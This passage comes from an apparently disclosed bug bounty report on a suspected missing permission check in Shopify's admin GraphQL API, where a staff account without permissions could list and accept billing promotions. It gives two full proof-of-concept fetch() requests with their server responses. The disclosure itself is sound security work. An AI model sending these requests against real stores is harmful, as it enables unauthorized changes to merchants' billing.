However, since those GraphQL endpoints were found within the billing settings scope of the application, and that the staff I used to validate this had no permissions at all, I felt like there could be missing permissions check.\n\n## Steps to reproduce\n\n1. With a staff that has no permission, send this request to possibly list applicable promotions:\n\n\t```javascript\n\tfetch(\"https://{shop}.myshopify.com/admin/internal/web/graphql/core\", {\n\t  \"headers\": {\n\t\t\"accept\": \"application/json\",\n\t\t\"accept-language\": \"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\",\n\t\t\"content-type\": \"application/json\",\n\t\t\"sec-fetch-dest\": \"empty\",\n\t\t\"sec-fetch-mode\": \"cors\",\n\t\t\"sec-fetch-site\": \"same-origin\",\n\t\t\"x-csrf-token\": \"{csrf-token}\",\n\t\t\"x-shopify-web-force-proxy\": \"1\"\n\t  },\n\t  \"referrerPolicy\": \"no-referrer\",\n\t  \"body\": \"{\\\"operationName\\\": \\\"Promotions\\\",\\\"query\\\": \\\"query Promotions {\\\\n shop {\\\\n  id\\\\n  applicablePromotions {\\\\n   id\\\\n   amount {\\\\n    amount\\\\n    currencyCode\\\\n    __typename\\\\n   }\\\\n   endAt\\\\n   description\\\\n   creditCategory\\\\n   promotionType\\\\n   __typename\\\\n  }\\\\n  __typename\\\\n }\\\\n}\\\"}\",\n\t  \"method\": \"POST\",\n\t  \"mode\": \"cors\",\n\t  \"credentials\": \"include\"\n\t});\n\t```\n 1.2. The response returned by this request looks like the following:\n\n\t```json\n\t{\n\t  \"data\": {\n\t\t\"shop\": {\n\t\t  \"id\": \"gid:\\\\/\\\\/shopify\\\\/Shop\\\\/45677445142\",\n\t\t  \"applicablePromotions\": [],\n\t\t  \"__typename\": \"Shop\"\n\t\t}\n\t  },\n\t  \"extensions\": {\n\t\t\"cost\": {\n\t\t  \"requestedQueryCost\": 2,\n\t\t  \"actualQueryCost\": 2,\n\t\t  \"throttleStatus\": {\n\t\t\t\"maximumAvailable\": 10000,\n\t\t\t\"currentlyAvailable\": 9998,\n\t\t\t\"restoreRate\": 500\n\t\t  }\n\t\t}\n\t  }\n\t}\n\t```\n\n2. Now, taking into consideration that the list would have return all the applicable promotions, the staff could possible accept a promotion by sending the following GrapQL request:\n\n\t```javascript\n\tfetch(\"https://{shop}.myshopify.com/admin/internal/web/graphql/core\", {\n\t  \"headers\": {\n\t\t\"accept\": \"application/json\",\n\t\t\"accept-language\": \"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\",\n\t\t\"content-type\": \"application/json\",\n\t\t\"sec-fetch-dest\": \"empty\",\n\t\t\"sec-fetch-mode\": \"cors\",\n\t\t\"sec-fetch-site\": \"same-origin\",\n\t\t\"x-csrf-token\": \"{csrf-token}\",,\n\t\t\"x-shopify-web-force-proxy\": \"1\"\n\t  },\n\t  \"referrerPolicy\": \"no-referrer\",\n\t  \"body\": \"{\\\"operationName\\\": \\\"applicablePromotionAccept\\\",\\\"variables\\\": { \\\"id\\\": \\\"gid://shopify/ApplicablePromotion/{promotion_id}\\\"},\\\"query\\\": \\\"mutation applicablePromotionAccept($id: ID!) {\\\\n applicablePromotionAccept(id: $id) {\\\\n  userErrors {\\\\n   field\\\\n   message\\\\n   __typename\\\\n  }\\\\n  __typename\\\\n }\\\\n}\\\"}\",\n\t  \"method\": \"POST\",\n\t  \"mode\": \"cors\",\n\t  \"credentials\": \"include\"\n\t});\n\t```\n\n 2.1. And the response returned by this request looks like the following:\n\n```json\n{\n  \"data\": {\n\t\"applicablePromotionAccept\": {\n\t  \"userErrors\": [\n\t\t{\n\t\t  \"field\": null,\n\t\t  \"message\": \"Promotion not found\",\n\t\t  \"__typename\": \"UserError\"\n\t\t}\n\t  ],\n\t  \"__typename\": \"ApplicablePromotionAcceptPayload\"\n\t}\n  },\n  \"extensions\": {\n\t\"cost\": {\n\t  \"requestedQueryCost\": 10,\n\t  \"actualQueryCost\": 10,\n\t  \"throttleStatus\": {\n\t\t\"maximumAvailable\": 10000,\n\t\t\"currentlyAvailable\": 9990,\n\t\t\"restoreRate\": 500\n\t  }\n\t}\n  }\n}\n```\n\n 2.2. Looking at the previous response from the `applicablePromotionAccept` mutation, we can see that there was no privileges issues returned, which suggests that a staff could possibly accept the promotion if the specified ID was valid.\n\n## Impact\n\nA staff with no permission could possibly list and accept what I believe to be promotions related to the account billing due to improper access control.","bounty_amount":"600.0","formatted_bounty":"$600","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":14,"voters":["battle_angel","drsniper","th4nu_0x0","ali","dastan_9408","h4x0r_dz","xaleraf4ra","cryptographer","meispi","stonerinjection","and 4 more..."],"severity":{"rating":"low","score":2.5,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"high","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9949892,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your report.
